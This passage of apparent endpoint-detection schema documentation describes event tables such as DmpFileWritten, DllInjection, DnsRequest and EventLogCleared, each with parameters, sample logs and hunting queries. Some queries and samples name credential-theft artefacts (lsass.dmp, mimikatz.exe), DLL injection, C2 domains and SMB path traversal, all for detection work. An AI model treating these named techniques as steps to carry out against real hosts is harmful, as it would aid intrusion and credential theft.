This table records events when a process completes writing a DEB (Debian Software Package) file. It provides details about the file, the process involved, and its location, which is useful for investigations into software installation, data transfer, and potential malware drops.

---

### 3. Important Parameter Description

| Parameter                | Description                                                                                                                                                                                                   | Platforms Affected |
|--------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------|
| ContextTimeStamp         | System time of event creation.                                                                                                                                                                                | All                |
| ContextProcessId         | UPID of process originating this event.                                                                                                                                                                       | All                |
| ContextThreadId          | UTID of thread originating this event                                                                                                                                                                         | All                |
| TreeId                   | If this event is part of a detection tree, the tree ID it is part of.                                                                                                                                         | All                |
| FileObject               | The file object representing the written file.                                                                                                                                                                | Windows Only       |
| MajorFunction            | The major function code of the IRP (I/O Request Packet).                                                                                                                                                    | Windows Only       |
| MinorFunction            | The minor function code of the IRP.                                                                                                                                                                         | Windows Only       |
| IrpFlags                 | Flags associated with the IRP.                                                                                                                                                                                | Windows Only       |
| OperationFlags           | Flags indicating specific operation characteristics.                                                                                                                                                          | Windows Only       |
| Size                     | The size of the written file in bytes.                                                                                                                                                                        | All                |
| DiskParentDeviceInstanceId | The device instance ID of the parent disk device.                                                                                                                                                             | All                |
| FileIdentifier           | A unique identifier for the file.                                                                                                                                                                             | All                |
| TargetFileName           | The resulting file name that was written.                                                                                                                                                                     | All                |
| IsOnNetwork              | Set to true if the relevant file listed in the event is on a network drive. False otherwise.                                                                                                                  | Windows Only       |
| IsOnRemovableDisk        | If true, it means this file was located on a removable disk.                                                                                                                                                  | All                |
| AuthenticationId         | Values: INVALID_LUID (0) NETWORK_SERVICE (996) LOCAL_SERVICE (997) SYSTEM (999)                                                                                                                               | Windows Only       |
| TokenType                | Values: INVALID_TOKEN (0) PRIMARY_TOKEN (1) IMPERSONATION_TOKEN (2)                                                                                                                                           | Windows Only       |
| UserName                 | The name of the user who performed the write operation.                                                                                                                                                       | All                |
| FileEcpBitmask           | Values: ECP_SRV_OPEN (0x00000001) ECP_CS_SENSOR_OPEN (0x00000002) ECP_CS_SENSOR_FILE_CHARACTERISTICS (0x00000004)                                                                                              | Windows Only       |
| TemporaryFileName        | The temporary name of the file during the write operation.                                                                                                                                                    | Windows Only       |
| FileWrittenFlags         | Values: HASH_IS_VALID (0x00000000) HASH_FAILED (0x00000001) HASH_ABORTED_TOO_LARGE (0x00000002) PAGING_WRITE (0x00000004)                                                                                   | Windows Only       |
| FileOperatorSid          | Security Identifier (SID) of the file operator.                                                                                                                                                               | Windows Only       |
| FileCategory             | Values: OTHER (0) ARCHIVES (1) OFFICE_DOCUMENTS (2) MULTIMEDIA_FILES (3) DESIGN_FILES (4) SOURCE_CODE (5) EXECUTABLE_FILES (6) VIRTUAL_MACHINE_FILES (7) EMAIL_FILES (8) DATA_AND_LOGS (9) ENCRYPTED (10) | All                |
| VolumeSessionUUID        | The UUID of the volume session where the file was written.                                                                                                                                                    | All                |
| FileSourcePath           | The source path of the file if it was copied or moved.                                                                                                                                                        | All                |
| MipInformation           | Microsoft Information Protection (MIP) related information.                                                                                                                                                   | All                |
| SHA256HashData           | The SHA256 hash of the written file.                                                                                                                                                                        | All                |
| ContextBaseFileName      | The base name of the file in the context of the event.                                                                                                                                                        | All                |
| MountNamespaceUniqueId   | Unique ID for the mount namespace.                                                                                                                                                                            | Linux Only         |
| RawProcessId             | The operating system's internal PID. For matching, use the UPID fields which guarantee a unique process identifier.                                                                                         | Linux Only         |
| RUID                     | The real UID for a unix style process.                                                                                                                                                                        | Linux Only         |
| RGID                     | The real GID for a unix style process.                                                                                                                                                                        | Linux Only         |
| FsMagic                  | The magic number of the file system.                                                                                                                                                                          | Linux Only         |
| DeviceMountCounter       | Counter for device mounts.                                                                                                                                                                                    | Linux Only         |
| DeviceId                 | Identifier for the device.                                                                                                                                                                                    | Linux Only         |
| FileSerialNumber         | Serial number of the file.                                                                                                                                                                                    | Linux Only         |
| ChangeTime               | Unix change time, indicating last status change or file modification. NOTE: This is the only timestamp which is not modifiable, unlike the other file timestamps.                                          | Linux Only         |

---

### 4. Sample Log Example

```json
{
  "ContextTimeStamp": "2023-10-27T10:00:00Z",
  "ContextProcessId": 12345,
  "ContextThreadId": 67890,
  "TreeId": "someTreeId",
  "FileObject": "0x12345678",
  "MajorFunction": 1,
  "MinorFunction": 0,
  "IrpFlags": 0,
  "OperationFlags": 0,
  "Size": 102400,
  "DiskParentDeviceInstanceId": "disk-123",
  "FileIdentifier": "file-abc",
  "TargetFileName": "/tmp/package.deb",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "AuthenticationId": 999,
  "TokenType": 1,
  "UserName": "user123",
  "FileEcpBitmask": 0,
  "TemporaryFileName": "",
  "FileWrittenFlags": 0,
  "FileOperatorSid": "S-1-5-21-...",
  "FileCategory": 1,
  "VolumeSessionUUID": "vol-uuid-1",
  "FileSourcePath": "",
  "MipInformation": {},
  "SHA256HashData": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
  "ContextBaseFileName": "package.deb",
  "MountNamespaceUniqueId": 123,
  "RawProcessId": 54321,
  "RUID": 1000,
  "RGID": 1000,
  "FsMagic": 61267,
  "DeviceMountCounter": 1,
  "DeviceId": 102,
  "FileSerialNumber": 456789,
  "ChangeTime": 1678886400
}
```
---
### 5. Example Queries
```xql
// Find all DEB files written
event_simpleName=DebFileWritten

// Find DEB files written to a specific target file name
event_simpleName=DebFileWritten TargetFileName="/var/cache/apt/archives/my_package.deb"

// Find DEB files written to removable media (Windows, macOS, Linux)
event_simpleName=DebFileWritten IsOnRemovableDisk=true

// Find DEB files written by a specific user (Windows, macOS, Linux)
event_simpleName=DebFileWritten UserName="root"

// Find DEB files with a specific SHA256 hash
event_simpleName=DebFileWritten SHA256HashData="a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"

// Find DEB files categorized as 'ARCHIVES' (Windows, macOS, Linux)
event_simpleName=DebFileWritten FileCategory=1
```
---
## DirectoryTraversalOverSMB Table: Directory Traversal Over SMB Event

### 1. Table Name
**DirectoryTraversalOverSMB**

---

### 2. Table Usage
This event indicates Directory traversal over an SMB session was detected. This is useful for investigations into attempts to access unauthorized directories on a remote system via SMB.

---

### 3. Important Parameter Description

| Parameter           | Description                                                                                                                                              | Platforms Affected |
|---------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------|
| RemoteAddressIP4    | The IPv4 address of the remote client attempting the directory traversal.                                                                                | Windows Only       |
| TargetDirectoryName | The target directory path involved in the traversal attempt.                                                                                             | Windows Only       |
| UserName            | The name of the user associated with the SMB session.                                                                                                    | Windows Only       |
| UserSid             | The User Security Identifier (UserSID) of the user who executed the command. A UserSID uniquely identifies a user in a system. Values: SELF_RID (0x01010000000000050A000000) | Windows Only       |
| LogonType           | The type of logon session. Values: INTERACTIVE (2) NETWORK (3) BATCH (4) SERVICE (5) PROXY (6) UNLOCK (7) NETWORK_CLEARTEXT (8) NEW_CREDENTIALS (9) REMOTE_INTERACTIVE (10) CACHED_INTERACTIVE (11) CACHED_REMOTE_INTERACTIVE (12) | Windows Only       |

---

### 4. Sample Log Example

```json
{
  "AuthenticationId": 1000,
  "EventThreshold": 2,
  "TargetDirectoryName": "C:\\Windows\\..\\..\\sensitive_data",
  "UserSid": "S-1-5-21-...",
  "UserName": "malicious_user",
  "UserPrincipal": "malicious_user@example.com",
  "LogonDomain": "EXAMPLE",
  "LogonType": 3,
  "ClientComputerName": "ATTACKER-PC",
  "RemoteAddressIP4": "192.168.1.10",
  "RemoteAddressIP6": "::1"
}
```
---
### 5. Example Queries
```xql
// Find all directory traversal attempts over SMB
event_simpleName=DirectoryTraversalOverSMB

// Find directory traversal attempts from a specific remote IPv4 address
event_simpleName=DirectoryTraversalOverSMB RemoteAddressIP4="192.168.1.10"

// Find directory traversal attempts targeting a specific directory name
event_simpleName=DirectoryTraversalOverSMB TargetDirectoryName="*..\\..\\*"

// Investigate directory traversal attempts by a specific user
event_simpleName=DirectoryTraversalOverSMB UserName="malicious_user"

// Find directory traversal attempts with a network logon type
event_simpleName=DirectoryTraversalOverSMB LogonType=3
```
---
## DllInjection Table: DLL Injection Event

### 1. Table Name
**DllInjection**

---

### 2. Table Usage
This table records events where DLL injection occurred in a target process. This is useful for investigations into malicious code injection, privilege escalation, and evasion techniques.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| InjectedDll | The name or path of the DLL that was injected. | Windows Only |
| InjectedThreadFlag | Flags indicating characteristics of the injected thread. Values: NONE (0x00000000) PREV_MODE_KERNEL (0x00000001) START_ADDRESS_IN_NAMED_PE (0x00000002) START_ADDRESS_IN_SYS_RANGE (0x00000004) SYSTEM_THREAD (0x00000008) SOURCE_PROCESS_IS_SYSTEM (0x00000010) TARGET_ANALYSIS_FAILED (0x00000020) CONTEXT_ANALYSIS_FAILED (0x00000040) START_ADDRESS_IN_NTDLL (0x00000080) START_ADDRESS_IN_WIN_DLL (0x00000100) START_ADDRESS_PRIVATE_MEM (0x00000200) | Windows Only |
| TargetProcessId | The unique ID of the target process where the DLL injection occurred. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ContextTimeStamp": "2023-10-27T10:00:00Z",
  "ContextProcessId": 1234,
  "ContextThreadId": 5678,
  "TreeId": "abc-123",
  "TargetProcessId": 9876,
  "TargetThreadId": 5432,
  "RawProcessId": 9876,
  "RawThreadId": 5432,
  "ThreadStartContext": "0x12345678",
  "ThreadStartAddress": "0xABCDEF01",
  "InjectedThreadFlag": 256,
  "InjectedDll": "C:\\Windows\\temp\\malicious.dll"
}
```
---

### 5. Example Queries
```xql
// Find all DLL injection events
event_simpleName=DllInjection

// Find DLL injection events for a specific target process ID
event_simpleName=DllInjection TargetProcessId=9876

// Find DLL injection events where a specific DLL was injected
event_simpleName=DllInjection InjectedDll="*malicious.dll*"

// Find DLL injection events with a specific injected thread flag (e.g., START_ADDRESS_IN_WIN_DLL)
event_simpleName=DllInjection InjectedThreadFlag=256
```
---
## DmpFileWritten Table: Dump File Written Event

### 1. Table Name
**DmpFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing a dump file. PidFromCommandLine will be enhanced in some cases to extract out the pid from the commandline of the writing process if possible. This event is useful for investigations into memory dumping, potential credential theft, or debugging activities.

---

### 3. Important Parameter Description

| Parameter                | Description                                                                                                                                                       | Platforms Affected |
|--------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------|
| ContextTimeStamp         | System time of event creation.                                                                                                                                    | All                |
| ContextProcessId         | UPID of process originating this event.                                                                                                                           | All                |
| ContextThreadId          | UTID of thread originating this event                                                                                                                             | All                |
| TreeId                   | If this event is part of a detection tree, the tree ID it is part of.                                                                                             | All                |
| FileObject               | The file object representing the written dump file.                                                                                                               | Windows Only       |
| MajorFunction            | The major function code of the IRP (I/O Request Packet).                                                                                                          | Windows Only       |
| MinorFunction            | The minor function code of the IRP.                                                                                                                               | Windows Only       |
| IrpFlags                 | Flags associated with the IRP.                                                                                                                                    | Windows Only       |
| OperationFlags           | Flags indicating specific operation characteristics.                                                                                                              | Windows Only       |
| Size                     | The size of the written dump file in bytes.                                                                                                                       | All                |
| DiskParentDeviceInstanceId | The device instance ID of the parent disk device.                                                                                                                 | All                |
| FileIdentifier           | A unique identifier for the file.                                                                                                                                 | All                |
| TargetFileName           | The resulting file name of the dump file that was written.                                                                                                        | All                |
| IsOnNetwork              | Set to true if the relevant file listed in the event is on a network drive. False otherwise.                                                                      | Windows Only       |
| IsOnRemovableDisk        | If true, it means this file was located on a removable disk.                                                                                                      | All                |
| AuthenticationId         | Values: INVALID_LUID (0) NETWORK_SERVICE (996) LOCAL_SERVICE (997) SYSTEM (999) RESERVED_LUID_MAX (1000)                                                          | Windows Only       |
| UserName                 | The name of the user who performed the dump file write operation.                                                                                                 | All                |
| FileEcpBitmask           | Values: ECP_SRV_OPEN (0x00000001) ECP_CS_SENSOR_OPEN (0x00000002) ECP_CS_SENSOR_FILE_CHARACTERISTICS (0x00000004)                                                 | Windows Only       |
| FileWrittenFlags         | Values: HASH_IS_VALID (0x00000000) HASH_FAILED (0x00000001) HASH_ABORTED_TOO_LARGE (0x00000002) PAGING_WRITE (0x00000004)                                         | Windows Only       |
| FileOperatorSid          | Security Identifier (SID) of the file operator.                                                                                                                   | Windows Only       |
| FileCategory             | Values: OTHER (0) ARCHIVES (1) OFFICE_DOCUMENTS (2) MULTIMEDIA_FILES (3) DESIGN_FILES (4) SOURCE_CODE (5) EXECUTABLE_FILES (6) VIRTUAL_MACHINE_FILES (7) EMAIL_FILES (8) DATA_AND_LOGS (9) ENCRYPTED (10) | All                |
| VolumeSessionUUID        | The UUID of the volume session where the file was written.                                                                                                        | macOS Only         |
| FileSourcePath           | The source path of the file if it was copied or moved.                                                                                                            | All                |
| MipInformation           | Microsoft Information Protection (MIP) related information.                                                                                                       | All                |
| SHA256HashData           | The SHA256 hash of the written dump file.                                                                                                                         | All                |
| ContextBaseFileName      | The base name of the file in the context of the event.                                                                                                            | All                |
| MountNamespaceUniqueId   | Unique ID for the mount namespace.                                                                                                                                | Linux Only         |
| RawProcessId             | The operating system's internal PID. For matching, use the UPID fields which guarantee a unique process identifier.                                             | Linux Only         |
| RUID                     | The real UID for a unix style process.                                                                                                                            | Linux Only         |
| RGID                     | The real GID for a unix style process.                                                                                                                            | Linux Only         |
| FsMagic                  | The magic number of the file system.                                                                                                                              | Linux Only         |
| DeviceMountCounter       | Counter for device mounts.                                                                                                                                        | Linux Only         |
| DeviceId                 | Identifier for the device.                                                                                                                                        | Linux Only         |
| FileSerialNumber         | Serial number of the file.                                                                                                                                        | Linux Only         |
| ChangeTime               | Unix change time, indicating last status change or file modification. NOTE: This is the only timestamp which is not modifiable, unlike the other file timestamps. | Linux Only         |

---

### 4. Sample Log Example

```json
{
  "ContextTimeStamp": "2023-10-27T10:00:00Z",
  "ContextProcessId": 54321,
  "ContextThreadId": 98765,
  "TreeId": "dump-tree-id",
  "FileObject": "0xABCDEF01",
  "MajorFunction": 1,
  "MinorFunction": 0,
  "IrpFlags": 0,
  "OperationFlags": 0,
  "Size": 2048000,
  "DiskParentDeviceInstanceId": "disk-xyz",
  "FileIdentifier": "dump-file-id",
  "TargetFileName": "C:\\Windows\\Temp\\lsass.dmp",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "AuthenticationId": 999,
  "UserName": "Administrator",
  "FileEcpBitmask": 0,
  "FileWrittenFlags": 0,
  "FileOperatorSid": "S-1-5-21-...",
  "FileCategory": 9,
  "VolumeSessionUUID": "vol-session-123",
  "FileSourcePath": "",
  "MipInformation": {},
  "SHA256HashData": "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
  "ContextBaseFileName": "lsass.dmp",
  "MountNamespaceUniqueId": 456,
  "RawProcessId": 54321,
  "RUID": 0,
  "RGID": 0,
  "FsMagic": 61267,
  "DeviceMountCounter": 1,
  "DeviceId": 102,
  "FileSerialNumber": 12345,
  "ChangeTime": 1678886400
}
```
---
### 5. Example Queries
```xql
// Find all dump files written
event_simpleName=DmpFileWritten

// Find dump files written with a specific target file name
event_simpleName=DmpFileWritten TargetFileName="*lsass.dmp*"

// Find dump files written by the Administrator user
event_simpleName=DmpFileWritten UserName="Administrator"

// Find dump files larger than 1MB
event_simpleName=DmpFileWritten Size > 1048576

// Find dump files written to a network drive (Windows only)
event_simpleName=DmpFileWritten IsOnNetwork=true
```
---
## DnsRequest Table: DNS Request Event

### 1. Table Name
**DnsRequest**

---

### 2. Table Usage
This event is generated when a process on a host makes a DNS query. The sensor captures the request and the corresponding response, including the queried domain and any returned IP addresses. Monitoring DNS requests is crucial for detecting a wide range of malicious activities, such as command-and-control (C2) communication, malware downloads, and connections to phishing sites.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| DomainName | The domain name that was queried. | All |
| RequestType | The type of DNS record requested (e.g., A, AAAA, CNAME, TXT). A value of `1` corresponds to an A record (IPv4). | All |
| FirstIP4Record | The first IPv4 address returned in the DNS response. | Windows |
| IP4Records | A list of all IPv4 addresses returned in the DNS response. | Windows, Linux, macOS |
| QueryStatus | The status code of the DNS query. A status of `0` typically indicates success, while others can indicate errors like `9003` (NXDOMAIN/Non-Existent Domain). | Windows, Linux, macOS |

---

### 4. Sample Log Example

```json
{
  "DomainName": "[www.google.com](https://www.google.com)",
  "RequestType": "1",
  "FirstIP4Record": "142.250.191.196",
  "IP4Records": [
    "142.250.191.196"
  ],
  "QueryStatus": "0"
}
```

---
### 5. Example Queries

```xql
// Find all DNS requests for a specific domain
event_simpleName=DnsRequest DomainName="*evil-c2-domain.com"

// Hunt for DNS requests for TXT records, which can be used for data exfiltration or C2
event_simpleName=DnsRequest RequestType=16

// Find DNS requests that resulted in a non-existent domain error (NXDOMAIN)
event_simpleName=DnsRequest QueryStatus=9003

// Search for domains that resolve to a specific suspicious IP address
event_simpleName=DnsRequest IP4Records="*198.51.100.55*"

// Look for A record requests (RequestType=1) and show the first IP address returned
event_simpleName=DnsRequest RequestType=1 | table DomainName, FirstIP4Record
```
---
## DriverLoad Table: Driver Load Event

### 1. Table Name
**DriverLoad**

---

### 2. Table Usage
This table records events related to a driver being loaded on a system. It is useful for investigations into the presence of malicious drivers, rootkits, or unauthorized software.

---

### 3. Important Parameter Description

| Parameter            | Description                                                                                                                                      | Platforms Affected |
|----------------------|--------------------------------------------------------------------------------------------------------------------------------------------------|--------------------|
| ImageFileName        | The full path to the executable (PE) file of the loaded driver.                                                                                   | Windows, Forensics |
| OriginalFilename     | The original filename of the PE, extracted from VersionInfo resource.                                                                          | Windows Only       |
| ServiceDisplayName   | The display name of the service associated with the driver.                                                                                    | Windows Only       |
| CompanyName          | The company name extracted from the driver's metadata.                                                                                         | Windows Only       |
| RpcClientProcessId   | The ProcessId corresponding to the RPC client of this request.                                                                                 | Windows Only       |
| SHA256HashData       | The SHA256 hash of the driver file. In most cases, the hash of the file referred to by the ImageFileName field. | Windows, Forensics |

---

### 4. Sample Log Example

```json
{
  "ContextTimeStamp": "2023-10-27T10:00:00Z",
  "ContextProcessId": 4567,
  "ContextThreadId": 8901,
  "TreeId": "driver-load-tree",
  "ImageFileName": "C:\\Windows\\System32\\drivers\\maliciousdriver.sys",
  "RegistryPath": "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\MaliciousDriver",
  "AuthenticodeHashData": "someAuthenticodeHash",
  "HashAlgorithm": "SHA256",
  "MD5HashData": "someMD5Hash",
  "SHA256HashData": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
  "CertificatePublisher": "Unknown Publisher",
  "CertificateIssuer": "Unknown Issuer",
  "CertificateThumbprint": "someThumbprint",
  "CertificateThumbprintAlgorithm": "SHA1",
  "OriginalFilename": "maliciousdriver.sys",
  "CompanyName": "Malicious Corp",
  "FileVersion": "1.0.0.0",
  "ServiceDisplayName": "Malicious Driver Service",
  "RpcClientProcessId": 1234,
  "RpcClientThreadId": 5678,
  "RemoteAddressIP4": "127.0.0.1",
  "RemoteAddressIP6": "::1",
  "ClientComputerName": "HOST-PC",
  "DriverLoadFlags": 0,
  "ImageTimeStamp": "2023-10-26T09:00:00Z",
  "ImageCheckSum": "0x12345",
  "ImageEntryPoint": "0xABCDEF",
  "FixedFileVersion": "1.0.0.0",
  "AuthenticodeHashDataSHA256": "anotherSHA256Hash"
}
```
---
### 5. Example Queries
```xql
// Find all driver load events with an unsigned status (Windows only)
event_simpleName=DriverLoad ImageFileName="*.sys" CertificatePublisher="Unknown Publisher"

// Find driver load events for a specific image filename
event_simpleName=DriverLoad ImageFileName="C:\\Windows\\System32\\drivers\\mygreatdriver.sys"

// Find driver load events with a specific SHA256 hash
event_simpleName=DriverLoad SHA256HashData="a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"

// Find driver load events by a specific company name (Windows only)
event_simpleName=DriverLoad CompanyName="Malicious Corp"

// Find driver load events where the original filename does not match the image filename (Windows only)
event_simpleName=DriverLoad OriginalFilename!=ImageFileName
```
---
## DriverLoadedV2DetectInfo Table: Driver Loaded V2 Detect Info Event

### 1. Table Name
**DriverLoadedV2DetectInfo**

---

### 2. Table Usage
This table provides detection-related information when a driver is loaded on a Windows system. It's useful for understanding the context and characteristics of loaded drivers, especially in the context of security detections.

---

### 3. Important Parameter Description

| Parameter           | Description                                                                                                                                                                                                        |
|---------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| SHA256HashData      | The SHA256 hash of a file. In most cases, the hash of the file referred to by the ImageFileName field.                                                                                                                                       |
| DriverImageFileName | The image filename of the loaded driver.                                                                                                                                                             |
| ImageFileName       | The full path to an executable (PE) file. The context of this field provides more information as to its meaning. For ProcessRollup2 events, this is the full path to the main executable for the created process. |

---

### 4. Sample Log Example

```json
{
  "ContextProcessId": 1234,
  "PatternId": "somePatternId",
  "TemplateInstanceId": "someTemplateInstanceId",
  "CertificatePublisher": "Microsoft Windows",
  "CertificateIssuer": "Microsoft Windows Production PCA 2011",
  "OriginalFilename": "my_driver.sys",
  "CompanyName": "My Company",
  "FileVersion": "1.0.0.0",
  "DriverImageFileName": "C:\\Windows\\System32\\drivers\\my_driver.sys",
  "ServiceDisplayName": "My Driver Service",
  "ImageFileName": "C:\\Windows\\System32\\svchost.exe",
  "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
  "PatternIdList": [],
  "ParentImageFileName": "C:\\Windows\\System32\\services.exe",
  "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
  "ParentProcessPatternIdList": [],
  "GrandparentImageFileName": "C:\\Windows\\System32\\wininit.exe",
  "GrandparentCommandLine": "wininit.exe",
  "GrandparentProcessPatternIdList": [],
  "AuthenticodeHashDataAsString": "someAuthenticodeHash",
  "CertificateThumbprintAsString": "someThumbprint",
  "ImageTimeStamp": "2023-10-26T09:00:00Z",
  "ImageCheckSum": "0x12345",
  "ImageEntryPoint": "0xABCDEF",
  "FixedFileVersion": "1.0.0.0",
  "SHA256HashData": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
  "AuthenticodeHashDataSHA256": "anotherSHA256Hash"
}
```
---
### 5. Example Queries
```xql
// Find driver loaded events with a specific SHA256 hash
event_simpleName=DriverLoadedV2DetectInfo SHA256HashData="a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"

// Find driver loaded events by a specific driver image filename
event_simpleName=DriverLoadedV2DetectInfo DriverImageFileName="C:\\Windows\\System32\\drivers\\my_driver.sys"

// Find driver loaded events where the image filename is svchost.exe
event_simpleName=DriverLoadedV2DetectInfo ImageFileName="C:\\Windows\\System32\\svchost.exe"
```
---
## ELFFileWritten Table: ELF File Written Event

### 1. Table Name
**ELFFileWritten**

---

### 2. Table Usage
This table records events when a file with a valid ELF (Executable and Linkable Format) image header is written to the system. ELF files are common executable and shared library formats on Unix-like operating systems. Monitoring these events is crucial for detecting the delivery of new executables, shared objects, or core dumps, which could indicate malware deployment, software installation, or system compromise.

---

### 3. Important Parameter Description

| Parameter      | Description                               | Platforms Affected |
|----------------|-------------------------------------------|--------------------|
| TargetFileName | The resulting file name that was written. | All                |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "/usr/local/bin/new_utility",
  "ContextTimeStamp": "1722230400000"
}
```
---
### 5. Example Queries
```xql
// Find all ELF files written with a specific target file name
event_simpleName=ELFFileWritten TargetFileName="/tmp/malicious_elf"

// Find ELF files written to a specific directory
event_simpleName=ELFFileWritten TargetFileName="/var/opt/new_app/*"

// Identify recently written ELF executables by file name patterns
event_simpleName=ELFFileWritten TargetFileName="*.elf" OR TargetFileName="*.so" OR TargetFileName="*.bin"
```
---
## EmailFileWritten Table: Email File Written Event

### 1. Table Name
**EmailFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing an email-related file (e.g., .eml, .msg, .pst). Monitoring these events can be crucial for detecting data exfiltration via email, phishing attempts, or the storage of sensitive communications.

---

### 3. Important Parameter Description

| Parameter      | Description                               | Platforms Affected |
|----------------|-------------------------------------------|--------------------|
| TargetFileName | The resulting file name that was written. | All                |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\user\\Documents\\draft_email.eml",
  "ContextTimeStamp": "1722230400000"
}
```
---
### 5. Example Queries
```xql
// Find all email files written with a specific target file name
event_simpleName=EmailFileWritten TargetFileName="*sensitive_report.msg*"

// Find email files written to a temporary directory
event_simpleName=EmailFileWritten TargetFileName="*\\Temp\\*.eml*"

// Identify recently written email files by common extensions
event_simpleName=EmailFileWritten TargetFileName="*.eml" OR TargetFileName="*.msg" OR TargetFileName="*.pst"
```
---
## EseFileWritten Table: ESE File Written Event

### 1. Table Name
**EseFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing an ESE (Extensible Storage Engine) database file. ESE databases are used by many Microsoft applications and services (e.g., Active Directory, Exchange, Windows Update). Monitoring these events can indicate legitimate database operations, but also potential data corruption, unauthorized access, or malware activity targeting system databases.

---

### 3. Important Parameter Description

| Parameter           | Description                                                                                  | Platforms Affected |
|---------------------|----------------------------------------------------------------------------------------------|--------------------|
| ContextBaseFileName | The base name of the context file that was written.                          | All                |
| TargetFileName      | The resulting file name that was downloaded.                                 | All                |
| IsOnNetwork         | Set to true if the relevant file listed in the event is on a network drive. False otherwise. | Windows Only       |
| IsOnRemovableDisk   | If true, it means this file was located on a removable disk.                 | All                |
| FileOperatorSid     | Security Identifier (SID) of the file operator.                                    | Windows Only       |

---

### 4. Sample Log Example

```json
{
  "ContextBaseFileName": "esent.edb",
  "TargetFileName": "C:\\Windows\\System32\\edb.log",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-18"
}
```
---
### 5. Example Queries
```xql
// Find all ESE files written to a network drive (Windows only)
event_simpleName=EseFileWritten IsOnNetwork=true

// Find ESE files written to a removable disk
event_simpleName=EseFileWritten IsOnRemovableDisk=true

// Investigate ESE file writes by a specific file operator SID (Windows only)
event_simpleName=EseFileWritten FileOperatorSid="S-1-5-18"

// Find ESE files with a specific target file name
event_simpleName=EseFileWritten TargetFileName="*temp_database.edb*"

// Find ESE files based on their context base file name
event_simpleName=EseFileWritten ContextBaseFileName="app_data.jrs"
```
---
## EventLogCleared Table: Event Log Cleared Event

### 1. Table Name
**EventLogCleared**

---

### 2. Table Usage
This table records events generated when a Windows event log is cleared. Clearing event logs can be a tactic used by attackers to remove traces of their activity. Monitoring these events is critical for detecting potential malicious activity and maintaining forensic integrity.

---

### 3. Important Parameter Description

| Parameter          | Description                                                                                  | Platforms Affected |
|--------------------|----------------------------------------------------------------------------------------------|--------------------|
| TargetFileName     | The resulting file name of the event log that was cleared.                           | Windows Only       |
| UserName           | The user name associated with the process that cleared the event log.                | Windows Only       |
| RpcClientProcessId | The ProcessId corresponding to the RPC client that initiated the event log clear operation. | Windows Only       |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Windows\\System32\\Winevt\\Logs\\Security.evtx",
  "UserName": "SYSTEM",
  "RpcClientProcessId": "4"
}
```
---
### 5. Example Queries
```xql
// Find all event log cleared events
event_simpleName=EventLogCleared

// Find event log cleared events for a specific log file (e.g., Security log)
event_simpleName=EventLogCleared TargetFileName="*Security.evtx*"

// Investigate event log cleared events initiated by a specific user
event_simpleName=EventLogCleared UserName="*Administrator*"

// Find event log cleared events by a specific RPC client process ID
event_simpleName=EventLogCleared RpcClientProcessId="4"
```
---
## ExecutableDeleted Table: Executable Deleted Event

### 1. Table Name
**ExecutableDeleted**

---

### 2. Table Usage
This table records events when an executable file is deleted from a host. This event is critical for identifying potential malicious activity, such as malware self-deletion to evade detection, or legitimate software uninstallation.

---

### 3. Important Parameter Description

| Parameter      | Description                               | Platforms Affected |
|----------------|-------------------------------------------|--------------------|
| TargetFileName | The resulting file name that was deleted. | All                |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Windows\\Temp\\malicious_payload.exe",
  "ContextTimeStamp": "1722230400000"
}
```
---
### 5. Example Queries
```xql
// Find all executable deleted events
event_simpleName=ExecutableDeleted

// Find executable deleted events for a specific file name
event_simpleName=ExecutableDeleted TargetFileName="*temp_tool.exe*"

// Identify recently deleted executables with common suspicious names
event_simpleName=ExecutableDeleted TargetFileName="*powershell.exe*" OR TargetFileName="*mimikatz.exe*"
```
---
## FileCreateInfo Table: File Creation Event

### 1. Table Name
**FileCreateInfo**

---

### 2. Table Usage
This table records events generated when a new file is created by a process on the endpoint. This event is fundamental for tracking file system activity, identifying new file drops (e.g., by malware), or monitoring legitimate application behavior.

---

### 3. Important Parameter Description

| Parameter      | Description                               | Platforms Affected |
|----------------|-------------------------------------------|--------------------|
| TargetFileName | The resulting file name that was created. | All                |
| UID            | Unix User Identifier.                     | macOS, Linux, Falcon Container |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "/home/user/new_document.txt",
  "UID": "1001"
}
```
---
### 5. Example Queries
```xql
// Find all file creation events for a specific target file name
event_simpleName=FileCreateInfo TargetFileName="*important_config.ini*"

// Find file creation events by a specific Unix User ID (UID)
event_simpleName=FileCreateInfo UID="1001"

// Identify recently created files in a suspicious directory by a specific UID
event_simpleName=FileCreateInfo TargetFileName="/tmp/*" UID="0"
```
---
## FileRenameInfo Table: File Rename Event

### 1. Table Name
**FileRenameInfo**

---

### 2. Table Usage
